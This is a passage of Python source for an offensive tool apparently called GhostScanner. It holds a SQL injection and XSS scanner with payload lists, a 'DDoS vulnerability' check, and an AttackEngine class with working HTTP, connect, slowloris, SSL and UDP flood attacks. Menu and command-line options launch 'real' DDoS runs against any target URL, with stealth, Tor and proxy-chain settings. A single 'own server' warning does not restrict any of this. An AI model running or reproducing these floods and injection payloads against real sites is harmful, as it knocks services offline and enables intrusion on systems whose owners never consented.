    def _check_ddos_vulnerability(self, target):
        findings = []
        try:
            start = time.time()
            resp = self._smart_request(target, timeout=15)
            elapsed = time.time() - start
            if not resp:
                return findings
            headers = dict(resp.headers)
            waf = None
            protection = []
            if 'cf-ray' in headers:
                waf = 'Cloudflare'
                protection.append('Cloudflare')
            if 'x-amz-cf-id' in headers:
                waf = 'AWS CloudFront'
                protection.append('AWS CloudFront')
            if 'x-sucuri-id' in headers:
                waf = 'Sucuri'
                protection.append('Sucuri')
            if 'incap_ses' in str(headers).lower():
                waf = 'Imperva'
                protection.append('Imperva')
            if 'akamai' in str(headers).lower():
                waf = 'Akamai'
                protection.append('Akamai')
            successes = 0
            for i in range(15):
                try:
                    r = self._smart_request(target, timeout=5)
                    if r and r.status_code < 400:
                        successes += 1
                except Exception:
                    pass
            rate_limited = (successes < 10)
            server = headers.get('Server', 'Unknown')
            slow_response = (elapsed > 5)
            vuln_score = 0
            if not protection:
                vuln_score += 3
            if not rate_limited:
                vuln_score += 3
            if slow_response:
                vuln_score += 1
            risk = 'CRITICAL' if vuln_score >= 5 else 'HIGH' if vuln_score >= 3 else 'MEDIUM' if vuln_score >= 1 else 'LOW'
            findings.append({
                "type": "DDoS/DoS Vulnerability Assessment", "param": "N/A", "payload": "N/A",
                "evidence": f"WAF: {waf or 'NONE'} | Rate Limit: {'YES' if rate_limited else 'NO'} | Response: {elapsed:.2f}s | Score: {vuln_score}/8",
                "risk": risk, "confidence": 85,
                "poc": {"url": target,
                         "curl": f"for i in {{1..50}}; do curl -s -o /dev/null \"{target}\"; done",
                         "response": f"WAF: {waf or 'NONE'} | Server: {server}",
                         "statusCode": resp.status_code, "timeDiff": f"{elapsed:.2f}s", "verified": True}
            })
        except Exception:
            pass
        return findings
    
    # ---------- SQL / XSS ----------
    def _check_sql(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            start = time.time()
            resp = self._smart_request(url, timeout=6)
            elapsed = time.time() - start
            if not resp:
                return None
            poc = {"url": url, "curl": f"curl -k \"{url}\"",
                   "response": resp.text[:300], "statusCode": resp.status_code,
                   "timeDiff": f"{elapsed:.2f}s", "verified": True}
            if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)', resp.text, re.I):
                return {"type": "SQL Injection (Error)", "param": param, "payload": payload[:100],
                        "evidence": "DB error", "risk": "CRITICAL", "confidence": 95, "poc": poc}
            if any(x in payload for x in ['SLEEP','WAITFOR']) and elapsed > 3:
                return {"type": "SQL Injection (Time)", "param": param, "payload": payload[:100],
                        "evidence": f"Delay {elapsed:.1f}s", "risk": "CRITICAL", "confidence": 85, "poc": poc}
        except Exception:
            pass
        return None
    
    def _scan_sql(self, target, params):
        results = []
        bases = ["' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "1' AND '1'='1",
                 "' UNION SELECT NULL--", "' AND SLEEP(3)--"]
        payloads = bases[:]
        for p in bases:
            payloads.append(urllib.parse.quote(p))
            payloads.append(p.upper())
        tasks = [(param, value, payload) for param, value in params.items() for payload in payloads[:8]]
        if not tasks:
            return results
        Console().print("[bold red]SQL Injection scan...[/bold red]")
        with ThreadPoolExecutor(max_workers=min(self.threads, 30)) as ex:
            futures = [ex.submit(self._check_sql, target, p, v, pl) for p, v, pl in tasks]
            for f in as_completed(futures):
                r = f.result()
                if r:
                    results.append(r)
        return results
    
    def _check_xss(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            resp = self._smart_request(url, timeout=6)
            if not resp:
                return None
            if payload not in resp.text:
                return None
            return {"type": "XSS (Reflected)", "param": param, "payload": payload[:100],
                    "evidence": "Payload reflected", "risk": "HIGH", "confidence": 85,
                    "poc": {"url": url, "curl": f"curl -k \"{url}\"",
                             "response": resp.text[:300], "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}}
        except Exception:
            return None
    
    def _scan_xss(self, target, params):
        results = []
        payloads = ['<script>alert(1)</script>', '<svg onload=alert(1)>',
                    '<img src=x onerror=alert(1)>', '" onmouseover=alert(1) "',
                    "'><script>alert(1)</script>", 'javascript:alert(1)']
        tasks = [(p, v, pl) for p, v in params.items() for pl in payloads]
        if not tasks:
            return results
        Console().print("[bold cyan]XSS scan...[/bold cyan]")
        with ThreadPoolExecutor(max_workers=min(self.threads, 30)) as ex:
            futures = [ex.submit(self._check_xss, target, p, v, pl) for p, v, pl in tasks]
            for f in as_completed(futures):
                r = f.result()
                if r:
                    results.append(r)
        return results
    
    # ---------- DISPLAY ----------
    def _display(self, findings):
        c = Console()
        s = self.results_scan["summary"]
        bc = self.results_scan.get("bot_check", {})
        
        protection = []
        if bc.get("waf"):
            protection.append(f"WAF: {', '.join(bc['waf'])}")
        if bc.get("captcha"):
            protection.append(f"CAPTCHA: {bc['captcha']}")
        if bc.get("rate_limit"):
            protection.append("RATE LIMIT")
        
        c.print(Panel(
            f"[bold]Target:[/bold] {self.results_scan['target']}\n"
            f"[bold]Category:[/bold] {self.results_scan['domain_category']}\n"
            f"[bold]Bot Check:[/bold] {', '.join(protection) if protection else 'None detected'}\n"
            f"[bold]Server:[/bold] {bc.get('server', 'Unknown')}\n"
            f"[bold]Total:[/bold] {s['total']} | "
            f"[red]Critical:[/red] {s['critical']} | "
            f"[yellow]High:[/yellow] {s['high']} | "
            f"[cyan]Medium:[/cyan] {s['medium']} | "
            f"[green]Low:[/green] {s['low']}",
            title=f"[bold white]SUMMARY v{TOOLS_VERSION}[/bold white]",
            border_style="red"))
        
        if findings:
            t = Table(title="Findings", box=box.ROUNDED)
            for col in ["Type", "Param", "Risk", "Verified"]:
                t.add_column(col)
            for f in findings[:30]:
                v = "OK" if f.get('poc', {}).get('verified') else "?"
                t.add_row(f.get('type','Unknown')[:40], str(f.get('param','N/A'))[:20],
                          f.get('risk','INFO'), v)
            c.print(t)
        else:
            c.print("[green]No vulnerabilities found.[/green]")
    
    # ---------- PDF ----------
    def _generate_pdf(self, results, output_path="report.pdf"):
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font('Arial', 'B', 16)
                    self.cell(0, 10, f'{TOOLS_NAME} v{TOOLS_VERSION} - Report', ln=True, align='C')
                    self.ln(5)
                def footer(self):
                    self.set_y(-15)
                    self.set_font('Arial', 'I', 8)
                    self.cell(0, 10, f'Page {self.page_no()}', align='C')
            
            pdf = PDF()
            pdf.add_page()
            pdf.set_font('Arial', '', 11)
            pdf.cell(0, 8, f'Target: {results["target"]}', ln=True)
            pdf.cell(0, 8, f'Category: {results.get("domain_category","N/A")}', ln=True)
            pdf.cell(0, 8, f'Time: {results["timestamp"]}', ln=True)
            pdf.cell(0, 8, f'Duration: {results["scan_duration"]:.2f}s', ln=True)
            pdf.ln(3)
            
            # Bot check
            bc = results.get("bot_check", {})
            if bc:
                pdf.set_font('Arial', 'B', 13)
                pdf.cell(0, 8, 'Bot Check', ln=True)
                pdf.set_font('Arial', '', 10)
                pdf.cell(0, 8, f'WAF: {", ".join(bc.get("waf", [])) or "None"}', ln=True)
                pdf.cell(0, 8, f'CAPTCHA: {bc.get("captcha") or "None"}', ln=True)
                pdf.cell(0, 8, f'Rate Limit: {bc.get("rate_limit", False)}', ln=True)
                pdf.ln(3)
            
            pdf.set_font('Arial', 'B', 13)
            pdf.cell(0, 8, 'Summary', ln=True)
            pdf.set_font('Arial', '', 11)
            s = results["summary"]
            pdf.cell(0, 8, f'Total: {s["total"]} | Critical: {s["critical"]} | High: {s["high"]} | Medium: {s["medium"]} | Low: {s["low"]}', ln=True)
            pdf.ln(3)
            
            pdf.set_font('Arial', 'B', 13)
            pdf.cell(0, 8, 'Vulnerabilities', ln=True)
            pdf.set_font('Arial', '', 9)
            for vt, vs in results["vulnerabilities"].items():
                if vs:
                    pdf.set_font('Arial', 'B', 10)
                    pdf.cell(0, 6, f'[{vt}] {len(vs)} finding(s)', ln=True)
                    pdf.set_font('Arial', '', 8)
                    for v in vs[:3]:
                        pdf.multi_cell(0, 5, f"  Param: {v.get('param','N/A')} | Payload: {str(v.get('payload','N/A'))[:50]} | Risk: {v.get('risk')}")
                    pdf.ln(1)
            
            pdf.output(output_path)
            Console().print(f"[green]PDF: {os.path.abspath(output_path)}[/green]")
        except Exception as e:
            Console().print(f"[yellow]PDF generation error: {e}[/yellow]")
    
    # ---------- MAIN SCAN ----------
    def run_scan(self, target):
        self.results_scan["target"] = target
        self.results_scan["domain"] = urlparse(target).netloc
        self.results_scan["domain_category"] = self._classify_domain(self.results_scan["domain"])
        self.results_scan["timestamp"] = datetime.now().isoformat()
        start = time.time()
        console = Console()
        console.print(f"[bold red]🚀 {TOOLS_NAME} v{TOOLS_VERSION} on {target}[/bold red]")
        console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")
        
        # Bot check first
        self._run_bot_check(target)
        
        # Access target
        console.print("[yellow]Accessing target...[/yellow]")
        resp = self._smart_request(target, timeout=25)
        html = resp.text if resp else ""
        
        if not html:
            console.print("[red]Target heavily protected or unreachable. Partial scan only.[/red]")
        
        # Internal checks
        console.print("[bold cyan]═══ INTERNAL CHECKS ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["robots"] = self._check_robots(target)
        self.results_scan["vulnerabilities"]["sensitive_files"] = self._check_sensitive_files(target)
        self.results_scan["vulnerabilities"]["security_headers"] = self._check_security_headers(target)
        self.results_scan["vulnerabilities"]["waf_detection"] = self._check_waf(target)
        self.results_scan["vulnerabilities"]["deface"] = self._check_deface(target)
        self.results_scan["vulnerabilities"]["ddos_vulnerability"] = self._check_ddos_vulnerability(target)
        
        # Params
        forms = self._extract_forms(html, target)
        all_p = {}
        all_p.update(self._extract_params_from_url(target))
        for form in forms:
            if form['method'] == 'GET':
                for i in form['inputs']:
                    all_p[i['name']] = '1'
        if not all_p:
            for c in self.common_params[:30]:
                all_p[c] = '1'
        params = dict(list(all_p.items())[:100])
        
        # Sensitive data
        all_s = [self._extract_sensitive_data(html)]
        
        # Admin bypass
        if self.force_admin or self.scan:
            self._run_admin_bypass(target, html)
        
        # SQL & XSS
        console.print("[bold cyan]═══ INJECTION SCAN ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["sql_injection"] = self._scan_sql(target, params)
        self.results_scan["vulnerabilities"]["xss_context_aware"] = self._scan_xss(target, params)
        
        # Summary
        all_f = []
        for cat, items in self.results_scan["vulnerabilities"].items():
            if isinstance(items, list):
                all_f.extend(items)
        self.results_scan["summary"] = {
            "total": len(all_f),
            "critical": len([f for f in all_f if f.get('risk') == 'CRITICAL']),
            "high": len([f for f in all_f if f.get('risk') == 'HIGH']),
            "medium": len([f for f in all_f if f.get('risk') == 'MEDIUM']),
            "low": len([f for f in all_f if f.get('risk') == 'LOW'])
        }
        self.results_scan["scan_duration"] = time.time() - start
        self.results_scan["validated"] = True
        
        self._display(all_f)
        
        # Save JSON
        jf = f"{self.result_folder}/scan_{int(time.time())}.json"
        with open(jf, 'w', encoding='utf-8') as f:
            json.dump(self.results_scan, f, indent=2, ensure_ascii=False)
        console.print(f"[green]JSON: {os.path.abspath(jf)}[/green]")
        
        if self.pdf:
            self._generate_pdf(self.results_scan, f"{self.result_folder}/report_{int(time.time())}.pdf")
        
        return self.results_scan


# =====================================================# ATTACK ENGINE
# =====================================================class AttackEngine:
    def __init__(self, target, threads=200, duration=30, method='http'):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.method = method
        self.running = False
        self.stats = {'success': 0, 'fail': 0}
        self.lock = threading.Lock()
        try:
            import cloudscraper
            self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
        except ImportError:
            self.scraper = requests.Session()
    
    def start(self):
        c = Console()
        c.print(f"[bold red]🔥 REAL ATTACK: {self.method.upper()}[/bold red]")
        c.print(f"[yellow]Target: {self.target} | Threads: {self.threads} | Duration: {self.duration}s[/yellow]")
        c.print("[bold red]⚠ Only use on YOUR OWN server![/bold red]\n")
        self.running = True
        
        workers = {
            'http': self._http_flood,
            'syn': self._syn_flood,
            'slow': self._slowloris,
            'ssl': self._ssl_reneg,
            'udp': self._udp_flood,
        }
        fn = workers.get(self.method, self._http_flood)
        for _ in range(self.threads):
            threading.Thread(target=fn, daemon=True).start()
        
        start = time.time()
        try:
            while time.time() - start < self.duration:
                time.sleep(2)
                with self.lock:
                    c.print(f"[cyan]⚡ Success: {self.stats['success']} | Fail: {self.stats['fail']} | {int(time.time()-start)}s/{self.duration}s[/cyan]")
        except KeyboardInterrupt:
            c.print("[yellow]Stopped.[/yellow]")
        self.running = False
        c.print(f"\n[bold green]✓ Attack finished. OK={self.stats['success']} Fail={self.stats['fail']}[/bold green]")
    
    def _http_flood(self):
        while self.running:
            try:
                h = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*', 'Connection': 'keep-alive'}
                self.scraper.get(self.target, headers=h, timeout=3)
                with self.lock:
                    self.stats['success'] += 1
            except Exception:
                with self.lock:
                    self.stats['fail'] += 1
            time.sleep(random.uniform(0.001, 0.01))
    
    def _syn_flood(self):
        try:
            d = self.target.replace('https://','').replace('http://','').split('/')[0]
            port = 443 if 'https' in self.target else 80
        except Exception:
            return
        while self.running:
            try:
                ip = socket.gethostbyname(d)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + d.encode() + b"\r\n\r\n")
                s.close()
                with self.lock:
                    self.stats['success'] += 1
            except Exception:
                with self.lock:
                    self.stats['fail'] += 1
            time.sleep(random.uniform(0.001, 0.005))
    
    def _slowloris(self):
        pool = []
        try:
            d = self.target.replace('https://','').replace('http://','').split('/')[0]
            port = 443 if 'https' in self.target else 80
        except Exception:
            return
        while self.running:
            try:
                while len(pool) < 50:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((d, port))
                    s.send(b"GET /?" + os.urandom(4).hex().encode() + b" HTTP/1.1\r\n")
                    s.send(b"Host: " + d.encode() + b"\r\n")
                    pool.append(s)
                    with self.lock:
                        self.stats['success'] += 1
                for s in list(pool):
                    try:
                        s.send(b"X-a: " + os.urandom(2).hex().encode() + b"\r\n")
                    except Exception:
                        pool.remove(s)
                time.sleep(5)
            except Exception:
                with self.lock:
                    self.stats['fail'] += 1
    
    def _ssl_reneg(self):
        try:
            d = self.target.replace('https://','').replace('http://','').split('/')[0]
        except Exception:
            return
        while self.running:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((d, 443))
                ss = ctx.wrap_socket(s, server_hostname=d)
                for _ in range(10):
                    ss.send(b"R" * 8192)
                ss.close()
                with self.lock:
                    self.stats['success'] += 1
            except Exception:
                with self.lock:
                    self.stats['fail'] += 1
            time.sleep(random.uniform(0.01, 0.05))
    
    def _udp_flood(self):
        try:
            d = self.target.replace('https://','').replace('http://','').split('/')[0]
        except Exception:
            return
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(1400)
                for _ in range(10):
                    s.sendto(payload, (d, random.choice([53,123,161,389,1900])))
                s.close()
                with self.lock:
                    self.stats['success'] += 1
            except Exception:
                with self.lock:
                    self.stats['fail'] += 1
            time.sleep(0.001)


# =====================================================# MENU
# =====================================================def show_menu():
    Console().print(Panel(f"""
[bold cyan]{TOOLS_NAME} v{TOOLS_VERSION} - MENU[/bold cyan]

[1] SCAN (Unified)     - Full automated scan
[2] TOOLS (External)   - External tools integration
[3] ATTACK (Real)      - Real DDoS/DoS (http/syn/slow/ssl/udp)
[4] BOT CHECKER        - Detect WAF/CAPTCHA/rate limit
[5] HELP               - Show help
[0] EXIT
""", border_style="cyan"))
    try:
        return Console().input("[bold green]Pilih menu: [/bold green]").strip()
    except (KeyboardInterrupt, EOFError):
        return "0"


# =====================================================# MAIN
# =====================================================def main():
    if '-h' in sys.argv or '--help' in sys.argv:
        show_help()
    
    if len(sys.argv) == 1:
        while True:
            choice = show_menu()
            if choice in ("0", "exit"):
                sys.exit(0)
            elif choice == "1":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target:
                    continue
                pdf = Console().input("Generate PDF? [y/N]: ").strip().lower() == 'y'
                tools = Console().input("Run external tools? [y/N]: ").strip().lower() == 'y'
                force = Console().input("Force admin bypass? [y/N]: ").strip().lower() == 'y'
                fast = Console().input("Fast mode? [Y/n]: ").strip().lower() != 'n'
                stealth = Console().input("Stealth mode? [y/N]: ").strip().lower() == 'y'
                scanner = GhostScanner(target=target, pdf=pdf, use_tools=tools,
                                        force_admin=force, scan=True, fast=fast,
                                        stealth=stealth)
                try:
                    scanner.run_scan(target)
                except KeyboardInterrupt:
                    Console().print("[red]Interrupted.[/red]")
                except Exception as e:
                    Console().print(f"[red]Error: {e}[/red]")
                    import traceback
                    traceback.print_exc()
                Console().input("\n[Press Enter to continue]")
            elif choice == "2":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target:
                    continue
                scanner = GhostScanner(target=target, use_tools=True)
                try:
                    scanner.run_scan(target)
                except Exception as e:
                    Console().print(f"[red]Error: {e}[/red]")
                Console().input("\n[Press Enter to continue]")
            elif choice == "3":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target:
                    continue
                method = Console().input("Method [dos/ddos/syn/slow/ssl-reneg/udp]: ").strip().lower()
                threads = int(Console().input("Threads [200]: ").strip() or "200")
                duration = int(Console().input("Duration [30s]: ").strip() or "30")
                m = "http"
                if method == "ddos":
                    m = "all"
                elif method == "syn":
                    m = "syn"
                elif method in ("ssl-reneg", "ssl"):
                    m = "ssl"
                elif method == "udp":
                    m = "udp"
                elif method == "slow":
                    m = "slow"
                AttackEngine(target, threads=threads, duration=duration, method=m).start()
                Console().input("\n[Press Enter to continue]")
            elif choice == "4":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target:
                    continue
                scanner = GhostScanner(target=target)
                scanner._run_bot_check(target)
                Console().input("\n[Press Enter to continue]")
            elif choice == "5":
                show_help()
            else:
                Console().print("[red]Invalid choice![/red]")
                time.sleep(1)
        return
    
    p = argparse.ArgumentParser(description=f"{TOOLS_NAME} v{TOOLS_VERSION}", add_help=False)
    p.add_argument("-u", "--url")
    p.add_argument("-o", "--output", default="results.json")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--proxy-list")
    p.add_argument("--validate-proxy", action="store_true")
    p.add_argument("--no-proxy", action="store_true")
    p.add_argument("--quick", action="store_true")
    p.add_argument("--pdf", action="store_true")
    p.add_argument("--delay", type=float, default=0.2)
    p.add_argument("--force-admin", action="store_true")
    p.add_argument("--tools", action="store_true")
    p.add_argument("--scan", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("--deep", action="store_true")
    p.add_argument("--stealth", action="store_true")
    p.add_argument("--tor", action="store_true")
    p.add_argument("--proxy-chain", action="store_true")
    p.add_argument("--dos", action="store_true")
    p.add_argument("--ddos", action="store_true")
    p.add_argument("--syn", action="store_true")
    p.add_argument("--slow", action="store_true")
    p.add_argument("--ssl-reneg", action="store_true")
    p.add_argument("--udp", action="store_true")
    p.add_argument("--threads", type=int, default=50)
    p.add_argument("--duration", type=int, default=30)
    args = p.parse_args()
    
    clear_screen()
    show_banner()
    
    if not args.url:
        try:
            args.url = Console().input("[bold cyan]Enter target URL: [/bold cyan]").strip()
            if not args.url:
                Console().print("[red]No target. Exiting.[/red]")
                sys.exit(1)
        except (KeyboardInterrupt, EOFError):
            Console().print("\n[yellow]Cancelled.[/yellow]")
            sys.exit(0)
    
    attack = (args.dos or args.ddos or args.syn or args.ssl_reneg or args.udp or args.slow)
    if attack:
        m = "http"
        if args.ddos:
            m = "all"
        elif args.syn:
            m = "syn"
        elif args.slow:
            m = "slow"
        elif args.ssl_reneg:
            m = "ssl"
        elif args.udp:
            m = "udp"
        AttackEngine(args.url, threads=args.threads, duration=args.duration, method=m).start()
    else:
        scanner = GhostScanner(
            target=args.url, use_proxy=not args.no_proxy,
            proxy_file=args.proxy_list,
            validate_proxy=args.validate_proxy, quick=args.quick,
            pdf=args.pdf, delay=args.delay, force_admin=args.force_admin,
            use_tools=args.tools, scan=args.scan, threads=args.threads,
            fast=args.fast, deep=args.deep, stealth=args.stealth,
            tor=args.tor, proxy_chain=args.proxy_chain
        )
        try:
            scanner.run_scan(args.url)
        except KeyboardInterrupt:
            Console().print("[red]Interrupted.[/red]")
        except Exception as e:
            Console().print(f"[red]Error: {e}[/red]")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()